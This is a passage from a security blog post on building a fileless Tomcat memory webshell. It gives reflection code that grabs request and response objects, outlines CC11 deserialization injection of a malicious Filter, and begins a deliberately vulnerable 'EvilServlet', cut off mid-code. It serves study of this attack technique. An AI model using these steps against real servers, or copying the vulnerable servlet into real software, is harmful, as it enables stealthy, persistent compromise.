    "@id": "/en/posts/tech/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="en/" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="en/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="en/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="en/posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="en/archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="en/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="en/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="en/about" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="en/">Home</a></div>
    <h1 class="post-title">
      Tomcat无文件内存马
    </h1>
    <div class="post-meta"><span title='2023-04-16 21:25:18 +0800 +0800'>2023-04-16</span>&nbsp;·&nbsp;17 min&nbsp;·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e5%89%8d%e8%a8%80" aria-label="前言">前言</a></li>
                    <li>
                        <a href="#%e5%9b%9e%e6%98%be%e9%97%ae%e9%a2%98" aria-label="回显问题">回显问题</a></li>
                    <li>
                        <a href="#%e5%86%85%e5%ad%98%e9%a9%ac%e5%ae%9e%e7%8e%b0" aria-label="内存马实现">内存马实现</a><ul>
                            
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e7%8e%af%e5%a2%83" aria-label="漏洞环境">漏洞环境</a></li>
                    <li>
                        <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%b3%a8%e5%85%a5" aria-label="反序列化注入">反序列化注入</a><ul>
                            
                    <li>
                        <a href="#%e6%ad%a5%e9%aa%a4%e4%b8%80" aria-label="步骤一">步骤一</a></li>
                    <li>
                        <a href="#%e6%ad%a5%e9%aa%a4%e4%ba%8c" aria-label="步骤二">步骤二</a><ul>
                            
                    <li>
                        <a href="#%e8%8e%b7%e5%be%97servletcontext" aria-label="获得ServletContext">获得ServletContext</a></li>
                    <li>
                        <a href="#%e6%b3%a8%e5%86%8cfilter" aria-label="注册Filter">注册Filter</a><ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%98%e4%b8%80" aria-label="问题一">问题一</a></li>
                    <li>
                        <a href="#%e9%97%ae%e9%a2%98%e4%ba%8c" aria-label="问题二">问题二</a></li>
                    <li>
                        <a href="#%e8%87%aa%e5%ae%9a%e4%b9%89filter%e4%bc%98%e5%85%88" aria-label="自定义filter优先">自定义filter优先</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#%e5%ae%9e%e7%8e%b0" aria-label="实现">实现</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#%e7%91%95%e7%96%b5" aria-label="瑕疵">瑕疵</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><h2 id="前言">前言<a hidden class="anchor" aria-hidden="true" href="#前言">#</a></h2>
<p>之前学习了Tomcat的相关内存马，通过jsp文件简单学习实现了一下，但是还是有些瑕疵的，内存马生成过程中还是有webshell文件落地的。</p>
<p>现在通过<code>天下大木头</code>,<code>threedr3am</code>师傅的博客学习一下通过反序列化实现内存马的生成。</p>
<h2 id="回显问题">回显问题<a hidden class="anchor" aria-hidden="true" href="#回显问题">#</a></h2>
<p>jsp中内置了request和response，我们是可以直接获取到，通过request获取参数，response写我们的回显内容。</p>
<p>我们要结合反序列化打，注入的是字节码，因此我们需要通过一些手段获取到request和response，这样我们就可以回显。</p>
<p>这里看一下tomcat处理http请求的堆栈情况，发现request和response一路传递，并且在内存中都是同一个变量，但是每个函数都是通过传参的的方式进行传递request和response。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417012148722.png" alt="image-20230417012148722"  />
</p>
<p><code>kingkk </code>师傅的思路是寻找一个静态的可以存储 request 和 response 的变量，因为如果不是静态的话，那么我们还需要获取到对应的实例。</p>
<p>最终kingkk 师傅在<code>org.apache.catalina.core.ApplicationFilterChain</code>这个类中，找到了符合要求的变量，这里<code>lastServicedRequest</code>和<code>lastServicedResponse</code>都是静态变量，是全局的。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417012618828.png" alt="image-20230417012618828"  />
</p>
<p>看一下<code>lastServicedRequest</code>和<code>lastServicedResponse</code>在哪些地方存在调用。</p>
<p>首先在<code>org.apache.catalina.core.ApplicationFilterChain</code>类中，在静态代码块会进行<code>lastServicedRequest</code>和<code>lastServicedResponse</code>的初始化，因为ApplicationDispatcher.WRAP_SAME_OBJECT 默认为 False ,根据静态代码块的最优先执行顺序，<code>lastServicedRequest</code>和<code>lastServicedResponse</code>会初始化为null.</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417013305966.png" alt="image-20230417013305966"  />
</p>
<p>然后在<code>ApplicationFilterChain#internalDoFilter</code>方法中，在执行Servlet的service方法前，先对ApplicationDispatcher.WRAP_SAME_OBJECT 的值进行判断，如果值为true，就将当前request和response分别存放到lastServicedRequest和lastServicedResponse里面。<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417013421665.png" alt="image-20230417013421665"  />
</p>
<p>最后在try-catch-finally语句中，在 finally 中又将 lastServicedRequest 和 lastServicedResponse 设为了 null。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417112557127.png" alt="image-20230417112557127"  />
</p>
<p>因此思路就很明确，通过反射，修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>的值为false,然后反射对<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个静态变量进行初始化，这样当程序执行到<code>ApplicationFilterChain#internalDoFilter()</code>方法的时候，就获取了request和response。</p>
<p>代码如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> updateFinalField(Class aclass,String filedName){
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>        java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> field = aclass.<span style="color:#007f7f">getDeclaredField</span>(filedName);
</span></span><span style="display:flex;"><span>      	<span style="color:#007f7f">// 修改final 变量的值反射流程
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> modifiersField = field.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;modifiers&#34;</span>);
</span></span><span style="display:flex;"><span>        modifiersField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        modifiersField.<span style="color:#007f7f">setInt</span>(field,field.<span style="color:#007f7f">getModifiers</span>() &amp; ~java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Modifier</span>.<span style="color:#007f7f">FINAL</span>);
</span></span><span style="display:flex;"><span>        field.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>      	<span style="color:#007f7f">// 对于WRAP_SAME_OBJECT,需要设置值为true.
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span>(filedName == <span style="color:#0ff;font-weight:bold">&#34;WRAP_SAME_OBJECT&#34;</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span>(!field.<span style="color:#007f7f">getBoolean</span>(<span style="color:#fff;font-weight:bold">null</span>)){
</span></span><span style="display:flex;"><span>                field.<span style="color:#007f7f">setBoolean</span>(<span style="color:#fff;font-weight:bold">null</span>,<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>          	<span style="color:#007f7f">// 对于lastServicedRequest 和 lastServicedResponse 我们需要将其初始化ThreadLocal()
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>            <span style="color:#fff;font-weight:bold">if</span>(field.<span style="color:#007f7f">get</span>(<span style="color:#fff;font-weight:bold">null</span>) == <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>               field.<span style="color:#007f7f">set</span>(<span style="color:#fff;font-weight:bold">null</span>,<span style="color:#fff;font-weight:bold">new</span> ThreadLocal());
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>        e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">static</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 修改WRAP_SAME_OBJECT 值为 true
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        String WRAP_SAME_OBJECT_NAME = <span style="color:#0ff;font-weight:bold">&#34;WRAP_SAME_OBJECT&#34;</span>;
</span></span><span style="display:flex;"><span>        String lastServicedRequestName = <span style="color:#0ff;font-weight:bold">&#34;lastServicedRequest&#34;</span>;
</span></span><span style="display:flex;"><span>        String lastServicedResponseName = <span style="color:#0ff;font-weight:bold">&#34;lastServicedResponse&#34;</span>;
</span></span><span style="display:flex;"><span>        Class&lt;?&gt; applicationDispatcherClass = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.ApplicationDispatcher&#34;</span>);
</span></span><span style="display:flex;"><span>        Class&lt;?&gt; applicationFilterChainClass = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        updateFinalField(applicationDispatcherClass,WRAP_SAME_OBJECT_NAME);
</span></span><span style="display:flex;"><span>        updateFinalField(applicationFilterChainClass,lastServicedRequestName);
</span></span><span style="display:flex;"><span>        updateFinalField(applicationFilterChainClass,lastServicedResponseName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>        e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="内存马实现">内存马实现<a hidden class="anchor" aria-hidden="true" href="#内存马实现">#</a></h2>
<p>实现内存马的大致思路：</p>
<p>1、我们通过反射实现<code>lastServicedRequest</code>、 <code>lastServicedResponse </code>初始化并存储request和response。</p>
<p>2、根据获得到的lastServicedRequest和lastServicedResponse获取request和response，然后利用request获取servletContext，然后动态注册Filter、Servlet、Listerner等组件。</p>
<p>我们这里是结合CC11链实现反序列化注册Filter内存马，其他种类内存马的实现大同小异。</p>
<h3 id="漏洞环境">漏洞环境<a hidden class="anchor" aria-hidden="true" href="#漏洞环境">#</a></h3>
<p>创建一个<code>Servlet</code>，存在一个反序列化注入点。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> servlet;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.ServletException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.annotation.WebServlet;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.http.HttpServlet;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.http.HttpServletRequest;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.http.HttpServletResponse;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.InputStream;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.ObjectInputStream;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName EvilServlet
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/4/16 21:39
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span>@WebServlet(<span style="color:#0ff;font-weight:bold">&#34;/evil&#34;</span>)
